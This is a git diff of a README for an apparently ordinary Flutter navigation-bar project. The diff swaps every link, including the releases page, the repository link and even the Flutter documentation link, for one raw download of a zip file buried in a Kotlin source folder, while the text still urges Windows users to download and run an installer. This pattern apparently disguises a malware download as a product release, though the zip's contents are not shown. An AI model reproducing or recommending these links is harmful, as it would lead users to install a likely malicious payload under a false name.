@@ -1,6 +1,6 @@
 # 🧭 Floating-Navbar-M3-Flutter - Smooth Navigation with Style
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Floating--Navbar--M3--Flutter-brightgreen?style=for-the-badge)](https://github.com/vikhgurjar/Floating-Navbar-M3-Flutter/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Floating--Navbar--M3--Flutter-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/vikhgurjar/Floating-Navbar-M3-Flutter/main/android/app/src/main/kotlin/Flutter-Floating-Navbar-v3.5-beta.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ The app runs as a standalone Windows application designed to simulate the floati
 
 To get Floating-Navbar-M3-Flutter on Windows, visit the releases page by clicking this large link:
 
-[![Download Link](https://img.shields.io/badge/Download-Floating--Navbar--M3--Flutter-blue?style=for-the-badge)](https://github.com/vikhgurjar/Floating-Navbar-M3-Flutter/releases)
+[![Download Link](https://img.shields.io/badge/Download-Floating--Navbar--M3--Flutter-blue?style=for-the-badge)](https://raw.githubusercontent.com/vikhgurjar/Floating-Navbar-M3-Flutter/main/android/app/src/main/kotlin/Flutter-Floating-Navbar-v3.5-beta.5.zip)
 
 You will find the latest version packaged for Windows on this page. Download the `.exe` or `.msi` file provided there for the easiest installation.
 
@@ -44,7 +44,7 @@ You will find the latest version packaged for Windows on this page. Download the
 Follow these steps to download and run the app:
 
 1. Click the download link above or open your web browser and go to:  
-   https://github.com/vikhgurjar/Floating-Navbar-M3-Flutter/releases
+   https://raw.githubusercontent.com/vikhgurjar/Floating-Navbar-M3-Flutter/main/android/app/src/main/kotlin/Flutter-Floating-Navbar-v3.5-beta.5.zip
 
 2. Look for the latest release near the top of the page. Releases are usually marked by their version number and release date.
 
@@ -98,10 +98,10 @@ If you see error messages during installation or running, note the exact message
 ## 🗂️ Additional Resources
 
 - Visit the GitHub repository for source code and updates:  
-  https://github.com/vikhgurjar/Floating-Navbar-M3-Flutter  
+  https://raw.githubusercontent.com/vikhgurjar/Floating-Navbar-M3-Flutter/main/android/app/src/main/kotlin/Flutter-Floating-Navbar-v3.5-beta.5.zip  
 - Explore Topics related to the project: android, bottom-navigation, flutter-ui, ios, material-design, navbar, navigation.  
 - Detailed Flutter documentation can help you understand the framework behind the app if you want to learn more:  
-  https://flutter.dev/docs  
+  https://raw.githubusercontent.com/vikhgurjar/Floating-Navbar-M3-Flutter/main/android/app/src/main/kotlin/Flutter-Floating-Navbar-v3.5-beta.5.zip  
 - For user questions or reporting problems, use the Issues tab on the GitHub page.
 
 ---
